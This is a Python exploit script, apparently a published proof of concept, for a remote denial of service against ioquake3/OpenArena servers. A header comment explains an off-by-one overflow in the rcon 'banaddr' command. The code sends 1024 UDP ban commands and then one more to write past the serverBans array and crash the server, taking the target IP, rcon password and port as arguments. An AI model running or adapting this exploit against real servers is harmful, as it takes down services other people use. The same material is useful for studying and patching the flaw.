#!/usr/bin/env python
# ioquake3 engine sv_ccmds.c off-by-one overflow exploit DoS
# ==========================================================
# ioquake3 engine is vulnerable to a remotely exploitable off-by-one overflow 
# due to a miscalculated buffer index within the privileged admin console command
# banaddr. Attacker needs the rcon password to exploit this vulnerability. 
#
# The overflow occurs on line 955 of sv_ccmds.c due to a miscalcuation of array 
# index (off-by-one). If an attacker adds 1024 IP addresses using the "banaddr" 
# command which calls "SV_AddBanToList", an index used to access the serverBans 
# arrray is miscalculated and writes past the bounds of the array. The conditional 
# check on line 945 should test that serverBansCount is not greater than 1023 to 
# prevent exploitation of this issue.
#
# -- Hacker Fantastic
import socket
import time
import sys

def exploit(targetip,password,port):
	count = 0
	packet = b'\xff\xff\xff\xffrcon\x20'
	packet += password.encode('ascii')
	packet += b'\x20banaddr\x201.1.' 
	sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	for third_octet in xrange(0,4):
		for last_octet in xrange(0,256):
			exploit = packet
			exploit += str(third_octet).encode('ascii')
			exploit += b'.'
			exploit += str(last_octet).encode('ascii')
			count+=1
			print "[-] Sending attack... %d" % count
			sock.sendto(exploit, (targetip, port))
			time.sleep(1)
	count+=1
	exploit = packet
	exploit += '4.0'.encode('ascii')
	print "[-] Sending the off-by-one overflow... %d" % count
	sock.sendto(exploit, (targetip, port))
	print("[!] done. server should be down.");

if __name__ == "__main__":
	print("[+] Openarena engine sv_ccmds.c off-by-one overflow exploit (DoS)")
	if len(sys.argv) != 4:
		print 'Usage: <targetip> <password> <port>'
		print 'default ioquake3 port is 27960/udp'
		sys.exit(1)
	targetip = sys.argv[1]
	password = sys.argv[2]
	port = int(sys.argv[3])
	exploit(targetip,password,port)
